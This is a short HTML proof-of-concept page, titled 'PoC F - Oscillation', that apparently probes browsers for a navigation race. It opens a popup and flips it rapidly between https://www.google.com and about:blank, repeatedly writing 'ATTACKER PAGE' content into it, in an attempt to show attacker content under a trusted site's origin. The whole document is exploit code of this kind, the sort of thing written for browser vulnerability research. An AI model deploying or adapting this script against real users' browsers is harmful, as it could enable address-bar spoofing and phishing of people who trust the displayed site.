<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC F - Oscillation</title>
</head>
<body>

<h2>Navigation Oscillation Race</h2>
<button onclick="run()">Run</button>

<script>
const TARGET = "https://www.google.com";

function run() {
  const w = window.open("about:blank");
  let count = 0;

  setTimeout(() => {
    const i = setInterval(() => {
      try {
        if (count % 2 === 0) {
          w.location.replace(TARGET);
        } else {
          w.location.replace("about:blank");
          setTimeout(() => {
            try {
              w.document.write("<h1>ATTACKER PAGE</h1>");
            } catch(e){}
          }, 0);
        }

        count++;
        if (count > 20) clearInterval(i);

      } catch(e) {
        clearInterval(i);
      }
    }, 1);
  }, 100);
}
</script>

</body>
</html>
